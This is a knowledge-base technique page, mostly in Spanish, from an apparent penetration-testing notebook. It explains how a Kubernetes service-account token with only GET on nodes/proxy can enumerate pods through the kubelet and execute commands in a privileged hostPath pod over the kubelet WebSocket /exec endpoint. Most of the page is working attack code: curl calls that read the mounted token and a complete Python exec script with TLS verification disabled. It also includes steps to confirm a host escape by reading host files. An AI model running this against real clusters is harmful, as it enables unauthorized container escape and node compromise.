---
title: Kubernetes nodes/proxy → kubelet WebSocket exec
slug: kubernetes-nodes-proxy-kubelet-exec
category: techniques
updated: 2026-08-01
summary: "Enumerate pods through GET nodes/proxy and reach a privileged hostPath pod via kubelet WebSocket exec"
tags: [kubernetes, kubelet, rbac, nodes-proxy, container-escape, mcp]
sensitive: false
---

# Kubernetes `nodes/proxy` → kubelet WebSocket exec

## When to use
Desde un pod con service-account token cuando el RBAC permite `get` sobre
`nodes/proxy`, aunque niegue listar pods o `create` sobre `nodes/proxy`.
Requiere conocer el nombre del nodo o probar el hostname del nodo.

## Key facts / commands

### 1. Confirmar permisos del service account

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}"
curl -sk -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
```

La señal útil es una regla equivalente a:

```text
verbs: [get]
resources: [nodes/proxy]
```

### 2. Enumerar pods a través del kubelet

```bash
NODE=fireflow                 # hostname del nodo en el caso observado
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$API/api/v1/nodes/$NODE/proxy/pods" | python3 -m json.tool
```

Buscar pods con la combinación peligrosa:

```text
hostPID: true
hostNetwork: true
securityContext.privileged: true
runAsUser: 0
hostPath / → /host/root
```

### 3. Ejecutar una orden en el pod privilegiado

El endpoint HTTP `/run` puede fallar porque exige `create nodes/proxy`. El
endpoint WebSocket `/exec` puede aceptar el mismo token cuando el kubelet
evalúa la conexión como `GET nodes/proxy`.

```python
import asyncio, ssl, websockets

NODE = "TARGET_IP"
NS = "monitoring"
POD = "prometheus-prometheus-node-exporter-POD_SUFFIX"
CONTAINER = "node-exporter"
TOKEN = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()

async def run(parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    params = "&".join(f"command={p}" for p in parts)
    url = (f"wss://{NODE}:10250/exec/{NS}/{POD}/{CONTAINER}"
           f"?output=1&error=1&{params}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10,
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    print(data[1:].decode(errors="replace"), end="")
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(run(["id"]))
```

Para confirmar el escape en un pod que monta el host root, leer de forma
controlada `/host/root/etc/hostname` o `/host/root/root/root.txt`.

## Gotchas

- `GET nodes/proxy` no implica permiso para listar nodos, listar pods ni hacer
  `POST /run`; enumera el nombre del nodo mediante el hostname o contexto local.
- `curl /run/...` puede devolver 403 mientras `/exec/...` por WebSocket funciona.
- El primer byte de cada frame WebSocket es el canal Kubernetes: `0=stdin`,
  `1=stdout`, `2=stderr`, `3=status`; hay que quitarlo al imprimir.
- Verificar la API de `websockets`: versiones recientes usan
  `additional_headers`; algunas antiguas usan `extra_headers`.
- No guardar tokens de service account, credenciales ni flags en la KB.

## Cleanup / rollback

- La técnica de lectura no requiere modificar el pod ni el host.
- Eliminar scripts temporales del pod comprometido y cerrar el WebSocket al
  terminar; registrar cualquier herramienta MCP añadida durante la prueba.

## References
- Relacionado: [[attacking-ai-llm]], [[privilege-escalation]], [[network-pivoting]], [[reverse-shells]]
- Kubernetes API: `nodes/proxy`, kubelet `/exec`, protocolo `v4.channel.k8s.io`
- Caso validado: FireFlow / Langflow + MCP + k3s (evidencia privada del engagement)
